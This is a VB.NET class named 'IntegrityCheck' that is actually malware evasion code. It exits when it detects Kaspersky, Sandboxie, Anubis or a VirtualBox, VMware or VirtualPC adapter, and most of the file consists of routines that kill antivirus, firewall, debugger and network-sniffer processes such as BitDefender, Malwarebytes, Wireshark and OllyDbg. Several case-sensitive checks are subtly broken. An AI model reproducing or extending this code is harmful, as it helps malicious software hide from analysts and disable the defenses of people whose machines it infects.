Imports Microsoft.Win32

Public Class IntegrityCheck
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Public AppPath As String = ""
    Public AppExePath As String = ""

    Public Sub RunCheck()
        If antiKAV() = True Then ProcKill()
        If antiSandboxie() = True Then ProcKill()
        If antiAnubis() = True Then ProcKill()
        If AntiVirtualBox() = True Then ProcKill()
        If AntiVmWare() = True Then ProcKill()
        If AntiVirtualPC() = True Then ProcKill()
        AntiOllydbg()
        AntiAdvancedProcessController()
        AntiexeinfoPE()
        AntiNetSnifferCs()
        AntiNetStat()
        AntiNetworkMiner()
        AntiTcpview()
    End Sub

    Sub ProcKill()
        Process.GetCurrentProcess.Kill()
    End Sub

    Public Function antiKAV() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("avp").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        Process.GetCurrentProcess.Kill()
    End Function
    Public Function antiSandboxie() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        Process.GetCurrentProcess.Kill()
    End Function

    Public Function antiAnubis() As Boolean
        On Error GoTo error1
        Dim folder As String = AppPath
        Dim getFile As String = folder & "\sample.exe"
        If AppExePath = getFile Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        Process.GetCurrentProcess.Kill()
    End Function

    Public Function AntiVirtualBox() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VirtualBox Graphics Adapter"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        Process.GetCurrentProcess.Kill()
    End Function

    Public Function AntiVmWare() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VMware SVGA II"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        Process.GetCurrentProcess.Kill()
    End Function

    Public Function AntiVirtualPC() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VM Additions S3 Trio32/64"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        Process.GetCurrentProcess.Kill()
    End Function
    Sub AntiBitDefender()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "bdagent"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiZoneAlarm()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "zlclient"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiSpyTheSpy()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "SpyTheSpy"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiSpeedGear()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "SpeedGear"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNetStat()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "xns5"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiTiGeRFirewall()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "TiGeR-Firewall"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiTcpview()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "Tcpview"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiComodo()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "cpf"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    'Sub Antismsniff()
    '    Dim generaldee As Process() = Process.GetProcesses
    '    Dim i As Integer
    '    For i = 0 To generaldee.Length - 1
    '        Select Case Strings.LCase(generaldee(i).ProcessName)
    '            Case "smsniff.exe"
    '                generaldee(i).Kill()
    '            Case Else
    '        End Select
    '    Next
    'End Sub
    Sub AntiWireshark()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "wireshark"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub Antismsniff()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "smsniff"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMalwarebytes()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "mbam"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiOllydbg()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "ollydbg"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiOutpost()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "outpost"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiapateDNS()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "apateDNS"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiIPBlocker()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "IPBlocker"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub Anticports()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "cports"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAdvancedProcessController()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "AdvancedProcessController"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub Antishowt()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "showt"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiexeinfoPE()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "exeinfoPE"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub Anticapsa()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "capsa"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNetSnifferCs()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "NetSnifferCs"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNetworkMiner()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "NetworkMiner"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub Antiregshot()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "regshot"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiRogueKiller()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "RogueKiller"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Private Sub getDevices()
        On Error GoTo error1
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
        Exit Sub
error1:
        Process.GetCurrentProcess.Kill()
    End Sub
End Class